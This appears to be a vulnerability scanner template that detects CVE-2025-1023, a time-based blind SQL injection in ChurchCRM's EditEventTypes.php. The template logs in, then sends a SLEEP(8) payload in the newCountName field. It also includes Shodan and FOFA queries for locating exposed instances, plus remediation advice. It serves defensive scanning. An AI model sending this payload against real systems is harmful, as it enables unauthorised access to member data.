http:
- matchers:
  - condition: and
    dsl:
    - duration_2 >= 8
    - status_code_2 == 500
    - 'contains(body_2, "<title>ChurchCRM: Edit Event Types")'
    type: dsl
  raw:
  - 'POST /session/begin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    User={{username}}&Password={{password}}

    '
  - '@timeout 30s

    POST /EditEventTypes.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    EN_tyid=1&newEvtName=Test&newEvtStartTime=10:30:00&newCountName=1%27%20AND%20(SELECT%20SLEEP(8))%20AND%20%271%27%3D%271&Action=ADD

    '
id: CVE-2025-1023
info:
  author: Kazgangap
  classification:
    cpe: cpe:2.3:a:churchcrm:churchcrm:*:*:*:*:*:*:*:*
    cve-id: CVE-2025-1023
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.75462
    epss-score: 0.00926
  description: 'A vulnerability exists in ChurchCRM 5.13.0 and prior that allows an
    attacker to execute arbitrary SQL queries by exploiting a time-based blind SQL
    Injection vulnerability in the EditEventTypes functionality. The newCountName
    parameter is directly concatenated into an SQL query without proper sanitization,
    allowing an attacker to manipulate database queries and execute arbitrary commands,
    potentially leading to data exfiltration, modification, or deletion.

    '
  impact: 'Authenticated attackers can execute arbitrary SQL queries through time-based
    blind SQL injection in ChurchCRM, leading to data exfiltration, modification,
    or deletion of church member information and potentially complete database compromise.

    '
  metadata:
    fofa-query: app="churchcrm"
    product: churchcrm
    shodan-query: http.title:"churchcrm"
    vendor: churchcrm
    verified: true
  name: ChurchCRM - SQL Injection
  reference:
  - https://github.com/ChurchCRM/CRM/issues/7246
  - https://github.com/Kazgangap/cve-poc-garage/blob/main/2025/CVE-2025-1023.md
  - https://nvd.nist.gov/vuln/detail/CVE-2025-1023
  remediation: 'Upgrade to ChurchCRM version 5.13.1 or later that addresses the SQL
    injection vulnerability.

    '
  severity: critical
  tags: cve,cve2025,authenticated,churchcrm,sqli
